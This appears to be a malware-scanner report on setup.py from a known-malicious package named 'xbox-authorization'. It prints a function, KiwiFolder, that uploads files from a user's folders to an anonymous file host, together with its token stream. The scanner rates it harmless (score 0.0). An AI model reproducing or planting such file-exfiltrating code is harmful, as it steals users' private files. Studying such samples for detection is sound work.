statistics:
  total_files: 1
  skipped_files: 0.0
  processed_objects: 1
  malicious_objects: 0
details:
- path: .repo_cache/malicious_repos/pypi_malregistry/xbox-authorization/1.0/xbox-authorization-1.0/xbox-authorization-1.0/setup.py
  contents:
  - name: KiwiFolder
    score: 0.0
    code: |-
      def KiwiFolder(pathF,keywords):
          global KiwiFiles
          maxfilesperdir=7
          i=0
          listOfFile=os.listdir(pathF)
          ffound=[]
          for file in listOfFile:
              if not os.path.isfile(pathF+'/'+file):return
              i+=1
              if i<=maxfilesperdir:
                  url=uploadToAnonfiles(pathF+'/'+file)
                  ffound.append([pathF+'/'+file,url])
              else:
                  break
          KiwiFiles.append(['folder',pathF+'/',ffound])
    tokens: TARGETED_FILE resume load_const INTEGER store_fast maxfilesperdir load_const INTEGER store_fast i load_global os load_attr listdir load_fast pathF call store_fast listOfFile build_list store_fast ffound load_fast listOfFile get_iter for_iter TO_NUMBER store_fast file load_global os load_attr path load_attr isfile load_fast pathF load_const / binary_op + load_fast file binary_op + call pop_jump_if_true TO_NUMBER pop_top return_const None load_fast i load_const INTEGER binary_op += store_fast i load_fast i load_fast maxfilesperdir compare_op <= pop_jump_if_false TO_NUMBER load_global STRING_LEN_S_ENT_HIGH load_fast pathF load_const / binary_op + load_fast file binary_op + call store_fast url load_fast ffound load_attr append load_fast pathF load_const / binary_op + load_fast file binary_op + load_fast url build_list call pop_top jump_backward TO_NUMBER pop_top jump_forward TO_NUMBER end_for load_global KiwiFiles load_attr append load_const folder load_fast pathF load_const / binary_op + load_fast ffound build_list call pop_top return_const None
    hash: 6beb5273b882fbfdea072aee2afa41460c0dfc9640058b1b2d33c4a6ab5f5a8c
sources:
  .repo_cache/malicious_repos/pypi_malregistry/xbox-authorization/1.0/xbox-authorization-1.0/xbox-authorization-1.0/setup.py: 
